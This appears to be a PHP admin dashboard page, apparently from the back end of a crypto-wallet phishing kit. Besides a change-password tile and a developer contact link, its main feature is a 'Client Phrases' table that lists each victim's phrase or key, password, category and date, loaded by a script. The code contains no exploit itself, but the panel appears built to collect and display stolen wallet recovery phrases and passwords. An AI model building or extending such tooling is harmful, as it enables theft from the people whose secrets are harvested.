<?php
include_once "back/assets/php/xxx.inc";
$meta['title'] = "Dashboard";
$meta['page'] = "back";
$meta['user'] = "show";
$meta['position-relative'] = 1;
include_once "back/assets/php/head.php";

if(logged()) {
?>
<section id="feature" class="feature-section feature-style-1 mt-0 pt-40">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-xxl-5 col-xl-5 col-lg-7 col-md-8">
                <div class="section-title text-center mb-30">
                    <h3 class="mb-15">Admin Dashboard</h3>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-6">
                <div class="single-feature">
                    <div class="feature-top change-password" style="cursor: pointer">
                        <div class="icon">
                            <i class="lni lni-lock"></i>
                        </div>
                        <div class="heading">
                            <h5>Change Password</h5>
                        </div>
                    </div>
                    
                </div>
            </div>
            <div class="col-md-6">
                <div class="single-feature">
                    <div class="feature-top">
                        <div class="icon">
                            <i class="lni lni-pie-chart"></i>
                        </div>
                        <a href="mailto:info@osaitech.dev" class="heading">
                            <h5>Contact Developer</h5>
                        </a>
                    </div>
                </div>
            </div>
        </div>
        <div class="row justify-content-center">
            <div class="col-xxl-5 col-xl-5 col-lg-7 col-md-8">
                <div class="section-title text-center mb-30">
                    <h3 class="mb-15">Client Phrases</h3>
                </div>
            </div>
        </div>
        <div class="table-responsive">
            <table class="table bg-dark text-light table-bordered">
                <thead>
                <tr>
                    <th><h6 class="text-light">#</h6></th>
                    <th><h6 class="text-light">Category</h6></th>
                    <th><h6 class="text-light">Type</h6></th>
                    <th><h6 class="text-light">Phrase/Key</h6></th>
                    <th><h6 class="text-light">Password</h6></th>
                    <th><h6 class="text-light">Date Created</h6></th>
                    <th><h6 class="text-light text-center">Action</h6></th>
                </tr>
                </thead>
                <tbody class="entry-body"><tr><td class="text-center" colspan="7">No Info Found!</td></tr></tbody>
            </table>
        </div>
    </div>
</section>
<?php } else echo "login to continue, if you can't login reload this page"; include_once "back/assets/php/foot.php" ?>
<script>
    loadPhrases()
</script>